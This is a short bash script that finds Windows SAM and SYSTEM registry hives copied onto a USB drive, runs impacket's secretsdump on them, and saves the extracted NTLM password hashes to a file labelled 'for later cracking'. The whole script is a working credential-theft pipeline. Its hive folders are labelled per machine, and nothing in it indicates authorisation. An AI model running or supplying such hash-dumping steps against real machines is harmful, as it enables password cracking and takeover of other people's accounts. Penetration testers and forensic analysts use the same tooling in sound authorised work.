# Set your USB mount
USB="/media/edward/USB20FD"

# Find the newest hive folder: hives/<LABEL>/<TIMESTAMP>
LATEST=$(find "$USB/hives" -mindepth 2 -maxdepth 2 -type d 2>/dev/null | sort | tail -n1)
[ -n "$LATEST" ] || { echo "[!] No hive folders found under $USB/hives"; exit 1; }

LABEL=$(basename "$(dirname "$LATEST")")
STAMP=$(basename "$LATEST")

# Resolve hive file paths (.save or raw)
SAM="$LATEST/SAM.save";   [ -f "$SAM" ]   || SAM="$LATEST/SAM"
SYS="$LATEST/SYSTEM.save";[ -f "$SYS" ]   || SYS="$LATEST/SYSTEM"

# Prepare results folder
OUT="$USB/results/$LABEL/$STAMP"
mkdir -p "$OUT"

# Run secretsdump (decode)
python3 -m impacket.examples.secretsdump -sam "$SAM" -system "$SYS" LOCAL | tee "$OUT/secretsdump_$(date +%F_%H-%M-%S).log"

# Extract NTLM hashes to a file (optional but handy for later cracking)
grep -E '^[^:]+:[0-9a-fA-F]{1,8}:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}' "$OUT"/secretsdump_*.log \
  | awk -F: '{print $1":"$3":"$4}' > "$OUT/hashes.txt"

echo
echo "Done (decode only). Artifacts:"
echo "  Log:    $OUT/$(ls -1t "$OUT"/secretsdump_*.log | head -n1)"
echo "  Hashes: $OUT/hashes.txt"
